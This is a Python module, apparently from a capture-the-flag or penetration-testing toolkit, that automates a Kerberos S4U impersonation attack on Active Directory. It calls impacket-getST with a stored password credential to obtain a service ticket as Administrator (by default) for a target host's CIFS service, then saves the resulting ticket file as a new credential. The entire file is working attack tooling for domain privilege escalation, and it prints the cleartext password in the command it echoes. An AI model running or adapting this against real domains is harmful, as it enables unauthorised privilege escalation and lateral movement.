import subprocess
from pathlib import Path

from core.target import get_active_cred


def run(data, cred, args):
    """
    Get service ticket via impersonation (S4U)

    Usage:
        ctf ad.getst
        ctf ad.getst Administrator
        ctf ad.getst Administrator cifs/host.domain
    """

    extra = getattr(args, "extra", []) or []

    # -------------------------
    # Defaults
    # -------------------------
    target_user = "Administrator"

    hostname = data.get("hostname") or data.get("name")
    domain = data.get("domain")

    if not hostname or not domain:
        print("[-] Missing hostname or domain")
        return data

    spn = f"cifs/{hostname}.{domain}"

    # -------------------------
    # Overrides
    # -------------------------
    if len(extra) >= 1:
        target_user = extra[0]

    if len(extra) >= 2:
        spn = extra[1]

    # -------------------------
    # Active credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return data

    username = cred.get("user")
    password = cred.get("secret") if cred.get("type") == "password" else None

    if not username or not password:
        print("[-] Need password-based credential")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "impacket-getST",
        "-spn", spn,
        "-impersonate", target_user,
        f"{domain}/{username}:{password}"
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr
    print(output)


    # -------------------------
    # Find generated ccache
    # -------------------------
    ccache_files = list(Path(".").glob("*.ccache"))

    if not ccache_files:
        print("[-] No ticket generated")
        return data

    # pick most recent file
    latest = max(ccache_files, key=lambda f: f.stat().st_mtime)

    print(f"[+] Got ticket: {latest.name}")

    return [{
        "user": target_user,
        "type": "ticket",
        "ccache": str(latest)
    }]